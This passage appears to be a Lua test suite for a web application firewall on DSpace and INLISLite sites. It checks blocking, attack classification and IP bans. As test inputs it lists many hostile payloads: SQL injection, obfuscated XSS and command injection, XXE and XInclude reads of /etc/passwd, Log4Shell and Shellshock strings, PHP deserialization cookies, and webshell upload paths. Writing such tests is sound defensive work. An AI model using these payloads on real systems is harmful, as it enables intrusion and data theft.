	ctype = "multipart/form-data; boundary=XyZ; pad=" .. ("a"):rep(1024),
	body = clean_q,
}) == 403, "a multipart Content-Type header over 1024 bytes must get 403")
check(body({
	ctype = "multipart/form-data; boundary=" .. ("a"):rep(71),
	body = "--" .. ("a"):rep(71) .. "--\r\n",
}) == 403, "a multipart boundary over 70 bytes must get 403")
check(body({
	ctype = "multipart/form-data; boundary=XyZ<bad>",
	body = "--XyZ<bad>--\r\n",
}) == 403, "a multipart boundary with non-RFC-2046 characters must get 403")

check(body({
	ctype = "application/octet-stream",
	headers = { ["content-type"] = { "application/octet-stream", "application/json" } },
	body = '{"q":"union"}',
}) == 403, "duplicate lowercase content-type headers must get 403")
check(body({
	ctype = "text/plain",
	headers = { ["Content-Type"] = { "text/plain", "application/x-www-form-urlencoded" } },
	body = "q=union",
}) == 403, "duplicate Content-Type headers must get 403")

check(request("203.0.113.120", { cookie = ("a=1;"):rep(200) }) == 200, "200 clean cookies must pass")
check(request("203.0.113.121", { cookie = ("a=1;"):rep(201) }) == 403, "more than 200 cookies must get 403")
check(
	request("203.0.113.122", { cookie = ("sl-session=a;"):rep(201) }) == 403,
	"more than 200 skipped cookies must still get 403"
)
check(request("203.0.113.123", { cookie = "=union" }) == 403, "a nameless cookie with a payload must get 403")
check(
	request("203.0.113.124", { cookie = "sl-session=abc, q=union" }) == 403,
	"a skipped cookie with non-token characters must be inspected"
)

check(request("203.0.113.130", { uri = "/etc/passw\0d" }) == 403, "a NUL byte in decoded URI must get 403")
check(
	request("203.0.113.131", { args = { ["a\0b"] = "1" } }) == 403,
	"a NUL byte in a query argument name must get 403"
)
check(
	request("203.0.113.132", { args = { q = "un\0ion" } }) == 403,
	"a NUL byte in a query argument value must get 403"
)
check(
	request("203.0.113.133", { args = { q = { "ok", "un\0ion" } } }) == 403,
	"a NUL byte in a multi-value query argument must get 403"
)
check(request("203.0.113.134", { cookie = "a%00b=1" }) == 403, "a %00 NUL byte in a cookie name must get 403")
check(request("203.0.113.135", { cookie = "q=un%00ion" }) == 403, "a %00 NUL byte in a cookie value must get 403")
check(
	request("203.0.113.136", { cookie = "sl-session=abc%00def" }) == 403,
	"a %00 NUL byte in a skipped cookie must get 403"
)
check(body({ ctype = form, body = "q=un%00ion" }) == 403, "a %00 NUL byte in a urlencoded body must get 403")
check(
	body({ ctype = "application/json", body = '{"q":"un\\u0000ion"}' }) == 403,
	"a \\u0000 NUL escape in a JSON body must get 403"
)
check(body({ ctype = "text/xml", body = "<a\0/>" }) == 403, "a NUL byte in an XML body must get 403")
check(
	body({ ctype = mp, body = part(field_q, "un\0ion") .. "--XyZ--\r\n" }) == 403,
	"a NUL byte in a multipart text field must get 403"
)
check(
	body({ ctype = "application/octet-stream", body = "bin\0data" }) == 200,
	"a NUL byte in an unchecked binary Content-Type body must pass"
)

check(
	request("203.0.113.150", { uri = "/\192\174\192\174/etc/passwd" }) == 403,
	"overlong 2-byte UTF-8 in decoded URI must get 403"
)
check(
	request("203.0.113.151", { args = { q = "\224\128\175etc/passwd" } }) == 403,
	"overlong 3-byte UTF-8 in query argument value must get 403"
)
check(
	request("203.0.113.152", { args = { ["\237\160\128"] = "1" } }) == 403,
	"UTF-16 surrogate in query argument name must get 403"
)
check(
	request("203.0.113.153", { cookie = "q=%F0%80%80%AF" }) == 403,
	"overlong 4-byte UTF-8 in cookie value must get 403"
)
check(body({ ctype = form, body = "q=%F4%90%80%80" }) == 403, "UTF-8 above U+10FFFF in form body must get 403")
check(body({ ctype = "text/xml", body = "<a>\245</a>" }) == 403, "invalid high byte 0xF5 in XML body must get 403")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="\192\175a.txt"', "ok") .. "--XyZ--\r\n",
}) == 403, "overlong UTF-8 in multipart header must get 403")
check(request("203.0.113.154", {
	uri = "/penelitian/caf\195\169/\227\129\130/\240\159\152\128",
	args = {
		q = "Pengantar \216\167\217\132\216\185\216\177\216\168\217\138\216\169 \224\160\128 \237\159\191 \244\143\191\191",
	},
	cookie = "lang=id_%C3%A9",
}) == 200, "valid multi-byte UTF-8 boundary sequences must pass")
check(body({
	ctype = mp,
	body = part('Content-Disposition: form-data; name="f"; filename="a.bin"', "\192\175\255\237\160\128")
		.. "--XyZ--\r\n",
}) == 200, "invalid UTF-8 bytes inside uploaded binary file body must pass")
localized_global.WAF_utf8_strict = false
check(
	request("203.0.113.155", { uri = "/\192\174" }) == 200,
	"disabling WAF_utf8_strict must allow legacy non-UTF-8 bytes"
)
localized_global.WAF_utf8_strict = true

local function hex(s)
	return (s:gsub(".", function(c)
		return string.format("%02x", c:byte())
	end))
end
local function urlencode(s)
	return (s:gsub("[^%w]", function(c)
		return string.format("%%%02X", c:byte())
	end))
end
local fifo = os.tmpname()
os.remove(fifo)
assert(os.execute("mkfifo " .. fifo))
local perl_in = assert(
	io.popen(
		[[perl -e '$| = 1; my %c; while (<STDIN>) { chomp; my ($r, $s, $f) = map { pack "H*", $_ } split /\t/, $_, -1; my $mod = join "", grep { index($f, $_) >= 0 } qw(i s); my $m = eval { $c{"$mod $r"} //= length $mod ? qr/(?$mod)$r/ : qr/$r/; $s =~ $c{"$mod $r"} ? 1 : 0 }; print defined $m ? $m : "E", "\n" }' > ]]
			.. fifo,
		"w"
	)
)
local perl_out = assert(io.open(fifo, "r"))
local memo = {}
re_find = function(s, p, flags)
	local k = (flags or "") .. "\0" .. p .. "\0" .. s
	if not memo[k] then
		perl_in:write(hex(p), "\t", hex(s), "\t", hex(flags or ""), "\n")
		perl_in:flush()
		memo[k] = perl_out:read("l")
	end
	if memo[k] == "E" then
		return nil, nil, "perl could not compile the regex"
	end
	return memo[k] == "1" and 1 or nil
end
_G.ngx = nil
localized_global = nil
dofile(script:gsub("waf%-ban%.lua$", "waf-local-overrides.lua"))
localized_global.WAF_body_block = true
localized_global.WAF_cookie_block = true
local json = "application/json"
local hmac = ("4b9e1a2f"):rep(8)
check(body({
	ctype = "application/json-patch+json",
	uri = "/server/api/submission/workspaceitems/12",
	body = [=[[{"op":"add","path":"/sections/traditionalpageone/dc.title","value":[{"value":"Teachers' and true friends"}]},{"op":"add","path":"/sections/traditionalpageone/dc.identifier.uri","value":[{"value":"https://doi.org/10.1234/5678"}]}]]=],
}) == 200, "real rules: a clean DSpace JSON Patch body must pass")
check(body({
	ctype = json,
	body = [[{"color":"#ffffff","path":"C:\\users\\nina","title":"Report \"A\"; part 1 -- draft","comment":"/* draft */"}]],
}) == 200, "real rules: clean JSON with a color, a Windows path, quotes, and comment marks must pass")
check(
	body({ ctype = json, body = [[{"q":"1\fUNION\fSELECT\f1,2"}]] }) == 403,
	"real rules: \\f-separated SQLi must get 403"
)
check(
	body({ ctype = json, body = [[{"bio":"<svg\fonload=alert(1)>"}]] }) == 403,
	"real rules: \\f-separated XSS must get 403"
)
check(
	body({ ctype = json, body = [[{"1' UNION SELECT 1,2-- -":{}}]] }) == 403,
	"real rules: SQLi in an outer JSON key must get 403"
)
check(
	body({ ctype = json, body = [[{"order.by":"(CASE WHEN 1=1 THEN a ELSE b END)"}]] }) == 403,
	"real rules: the sort parameter rule must apply to a JSON key"
)
check(body({
	ctype = "application/atom+xml",
	body = '<entry xmlns="http://www.w3.org/2005/Atom"><link href="https://example.org/1"/><source><title>ok</title></source></entry>',
}) == 200, "real rules: valid SWORDv2 Atom XML must pass")
check(body({
	ctype = "application/soap+xml",
	body = '<soap:Envelope><soap:Body><item online="true"/></soap:Body></soap:Envelope>',
}) == 200, "real rules: valid SOAP XML must pass")
for _, xml in ipairs({
	'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:/opt/dspace/config/local.cfg">]><a/>',
	'<java class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"/></java>',
	'<a xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></a>',
	"<a>${jndi:ldap://x/a}</a>",
	"<a><?php system('id'); ?></a>",
}) do
	check(body({ ctype = "text/xml", body = xml }) == 403, "real rules: an XML attack must get 403: " .. xml)
end
check(request("198.51.100.230", {
	cookie = "_csrf="
		.. urlencode(hmac .. 'a:2:{i:0;s:5:"_csrf";i:1;s:32:"abcdefghijklmnopqrstuvwxyz012345";}')
		.. "; sl-session=5Or3==",
}) == 200, "real rules: an INLISLite Yii2 signed _csrf cookie must pass")
check(
	request("198.51.100.231", { cookie = "_csrf=" .. urlencode(hmac .. 'O:23:"yii\\db\\BatchQueryResult":1:{}') })
		== 403,
	"real rules: a Yii2 HMAC-prefixed PHP object cookie must get 403"
)
check(
	request(
		"198.51.100.232",
		{ raw = "/uploaded_files/foto_anggota/shell%2ephp", uri = "/uploaded_files/foto_anggota/shell.php" }
	) == 403,
	"real rules: a decoded INLISLite upload webshell path must get 403"
)
check(
	body({ ctype = mp, body = pdf .. part(field_q, "Teachers' and true friends") .. "--XyZ--\r\n", file = true }) == 200,
	"real rules: a clean field after a 200 KB upload must pass"
)
for _, fn in ipairs({
	'filename="../../etc/passwd"',
	'filename="<script>alert(1)</script>"',
	"filename*=UTF-8''..%2F..%2Fetc%2Fpasswd",
	'filename="a;cat /etc/passwd"',
}) do
	check(body({
		ctype = mp,
		body = part('Content-Disposition: form-data; name="f"; ' .. fn, "ok") .. "--XyZ--\r\n",
	}) == 403, "real rules: malicious upload filename must get 403: " .. fn)
end
check(body({
	ctype = mp,
	body = part(
		'Content-Disposition: form-data; name="f"; filename="report (1).pdf"; filename*=UTF-8\'\'report%20%281%29.pdf',
		"ok"
	) .. "--XyZ--\r\n",
}) == 200, "real rules: clean RFC 6266 upload filenames must pass")
check(
	request("203.0.113.140", { cookie = "=%27%20or%201%3D1--" }) == 403,
	"real rules: nameless cookie boolean SQLi must get 403"
)
check(request("203.0.113.141", { cookie = "=../../etc/passwd" }) == 403, "real rules: nameless cookie LFI must get 403")
check(
	request("203.0.113.142", { cookie = "sl-session=abc, q=../../etc/passwd" }) == 403,
	"real rules: smuggled LFI inside sl-session cookie must get 403"
)
check(
	request("203.0.113.143", { cookie = "sl-session=5Or3-_./+~==" }) == 200,
	"real rules: valid opaque sl-session token must pass"
)
for i, payload in ipairs({
	"java&#x73;cript:alert(1)",
	"&#106;avascript:alert(1)",
	"&#0000000106;avascript:alert(1)",
	"&#x0000006a;avascript:alert(1)",
	"&#106avascript:alert(1)",
	"javascript&colon;alert(1)",
	"java&#09;script:alert(1)",
	"java&#0;script:alert(1)",
	"java&tab;script&colon;alert&lpar;1&rpar;",
	"&lt;script&gt;alert(1)&lt;/script&gt;",
}) do
	check(
		request("203.0.113." .. (160 + i), { args = { q = payload } }) == 403,
		"real rules: HTML-entity XSS in query value must get 403: " .. payload
	)
end
check(
	body({ ctype = form, body = "url=java%26%23x73%3Bcript%3Aalert%281%29" }) == 403,
	"real rules: HTML-entity XSS in form body must get 403"
)
check(
	body({ ctype = "text/xml", body = "<entry><summary>&lt;script&gt;alert(1)&lt;/script&gt;</summary></entry>" })
		== 403,
	"real rules: HTML-entity script tag in XML body must get 403"
)
check(body({
	ctype = "application/atom+xml",
	body = "<entry><title>A &amp; B</title><summary>&lt;p&gt;ok&lt;/p&gt;</summary></entry>",
}) == 200, "real rules: benign HTML entities in Atom XML must pass")
for i, payload in ipairs({
	";c'a't /etc/passwd",
	";c\\at /etc/passwd",
	';w"h"oami',
	";c^a^t /etc/passwd",
	"|p'y't'h'o'n3 -c x",
	"$(w'h'oami)",
}) do
	check(
		request("203.0.113." .. (175 + i), { args = { q = payload } }) == 403,
		"real rules: cmdLine-obfuscated CMDi in query value must get 403: " .. payload
	)
end
check(
	body({ ctype = json, body = [[{"q":";c'a't /etc/passwd"}]] }) == 403,
	"real rules: cmdLine-obfuscated CMDi in JSON body must get 403"
)
check(
	body({ ctype = json, body = [[{"q":"\uff1cscript\uff1ealert(1)\uff1c/script\uff1e"}]] }) == 403,
	"real rules: fullwidth JSON XSS escape must get 403"
)
for _, benign in ipairs({
	"Teachers&apos; &amp; students&apos; perceptions",
	"Report \"A\"; 'cat' breeds",
	'R & "Python" programming',
	"a=1&period=2025&tab=home",
}) do
	check(
		request("203.0.113.162", { args = { q = benign } }) == 200,
		"real rules: benign text with entities or quotes must pass: " .. benign
	)
end

for k in pairs(stats_store) do
	stats_store[k] = nil
end
local function stat(k)
	return stats_store[k] and stats_store[k].v or 0
end
request("198.51.100.240", { raw = "/uploaded_files/shell%2ephp", uri = "/uploaded_files/shell.php" })
request("198.51.100.241", { ctype = "text/xml", body = '<!DOCTYPE foo [<!ENTITY x "y">]><a/>' })
request(
	"198.51.100.242",
	{ ctype = "multipart/form-data; boundary=a; boundary=b", body = part(field_q, "x") .. "--a--\r\n" }
)
request("198.51.100.243", { ctype = json, body = [[{"q":"1 UNION SELECT 1,2"}]] })
request("198.51.100.244", { raw = "/a/..%2fetc/passwd", uri = "/etc/passwd", status = 403 })
request("198.51.100.245", { args = { q = "<script>alert(1)</script>" }, status = 403 })
request("198.51.100.246", { headers = { ["User-Agent"] = "${jndi:ldap://x/a}" }, status = 403 })
request("198.51.100.247", { headers = { ["X-Test"] = "() { :;}; id" }, status = 403 })
request("198.51.100.248", { status = 403, site_deny = true })
check(stat("attacks") == 9, "waf_stats must count every classified WAF attack")
check(stat("cat:scanner") == 1, "decoded upload webshell URI must be classified as scanner")
check(stat("cat:xxe") == 1, "XML rule hit must be classified as xxe")
check(stat("cat:protocol") == 1, "multipart boundary error must be classified as protocol")
check(stat("cat:sqli") == 1, "JSON SQLi hit must be classified as sqli")
check(stat("cat:lfi") == 1, "upstream raw URI traversal 403 must be classified as lfi")
check(stat("cat:xss") == 1, "upstream query value XSS 403 must be classified as xss")
check(stat("cat:rce") == 1, "upstream Log4Shell header 403 must be classified as rce")
check(stat("cat:cmdi") == 1, "upstream Shellshock header 403 must be classified as cmdi")
check(stat("cat:other") == 1, "site deny 403 with no rule match must fall back to other")

local stat_ban_ip = "198.51.100.249"
for _ = 1, 5 do
	request(stat_ban_ip, { args = { q = "1 union select 2" }, status = 403 })
end
check(stat("bans") == 1, "issuing a new ban must increment waf_stats bans once")
check(stat("attacks") == 14 and stat("cat:sqli") == 6, "5 upstream SQLi hits must add 5 attacks and 5 sqli")
check(request(stat_ban_ip) == 403, "banned IP must receive 403")
check(stat("banned_requests") == 1, "request blocked by active ban must increment banned_requests")
check(stat("attacks") == 14, "request blocked by active ban must not increment attacks again")

local ep_ip = "198.51.100.250"
for _ = 1, 3 do
	request(ep_ip, { raw = "/.env", uri = "/.env", error_page_444 = true })
end
for _ = 1, 2 do
	request(ep_ip, { args = { q = "1 union select 2" }, status = 403, error_page_444 = true })
end
check(request(ep_ip) == 403, "error_page 403 -> 444 wiping ngx.ctx must still record strikes and ban")
check(
	stat("bans") == 2 and stat("cat:scanner") == 4 and stat("cat:sqli") == 8,
	"error_page 403 -> 444 must still record stats and categories"
)
perl_in:close()
perl_out:close()
os.remove(fifo)

for _, path in ipairs(temps) do
	os.remove(path)
end

if failed > 0 then
	os.exit(1)
end
print("PASS")
